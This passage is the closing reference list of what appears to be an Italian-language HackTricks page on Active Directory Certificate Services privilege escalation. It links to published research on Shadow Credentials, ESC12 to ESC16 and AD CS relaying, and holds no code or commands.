- [8] [SpecterOps – Shadow Credentials: abuso del mapping degli account tramite Key Trust per la compromissione degli account](https://specterops.io/blog/2021/06/17/shadow-credentials-abusing-key-trust-account-mapping-for-account-takeover/)
- [9] [CQure Academy – La storia dell'(in)appropriato utilizzo delle Enhanced Key](https://cqureacademy.com/blog/enhanced-key-usage)
- [10] [Compass Security – Relay verso Active Directory Certificate Services tramite RPC](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/)
- [11] [hajo – ESC12: accesso shell alla CA di ADCS con YubiHSM](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm)
- [12] [SpecterOps – Tecnica di abuso ADCS ESC13](https://specterops.io/blog/2024/02/14/adcs-esc13-abuse-technique/)
- [13] [SpecterOps – Tecnica di abuso ADCS ESC14](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/)
- [14] [Certipy Wiki – Escalation dei privilegi (ESC1-ESC17)](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation)
- [15] [TrustedSec – EKUwu: non è l'ennesimo AD CS ESC](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc)
- [16] [Furious5 – AD CS ESC16: configurazione errata ed exploit](https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6)
{{#include ../../../banners/hacktricks-training.md}}
